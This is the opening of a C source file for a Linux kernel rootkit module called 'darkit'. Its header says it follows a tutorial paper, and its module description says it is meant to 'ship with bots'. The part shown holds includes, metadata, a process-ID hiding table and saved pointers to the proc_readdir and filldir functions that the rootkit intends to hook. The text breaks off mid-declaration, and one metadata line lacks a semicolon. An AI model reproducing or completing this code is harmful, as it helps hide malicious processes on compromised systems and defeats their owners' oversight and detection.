/* i wrote this by following https://w3.cs.jmu.edu/kirkpams/550-f12/papers/linux_rootkit.pdf
however i plan to add some additional functionality to make this rootkit more complete */
#include <linux/module.h>
#include <linux/kernel.h> 
#include <linux/proc_fs.h> // interface to kernel data structer
#include <linux/sched.h> // linux kernel scheduler API
#include <linux/string.h>
#include <linux/cred.h> // credential macro for active process credentials
#include <linux/stat.h> // file and filesystem status
#include <linux/uaccess.h> // user space memory access API
#include <linux/file.h>

#include "darkit.h"

MODULE_LICENSE("DUAL GPL/BSD");
MODULE_AUTHOR("mp");
MODULE_DESCRIPTION("a simple rootkit that should ship with bots")
MODULE_VERSION("0.0.1");

static int failed;
static char pid[10][32];
static int pid_index;

/* in the event that we want to unload the rootkit, we will need to save the
original pointer values */
static int (*old_proc_readdir) (struct file *, void *, filldir_t);
static filldir_t old_filldir;
static ssize_t
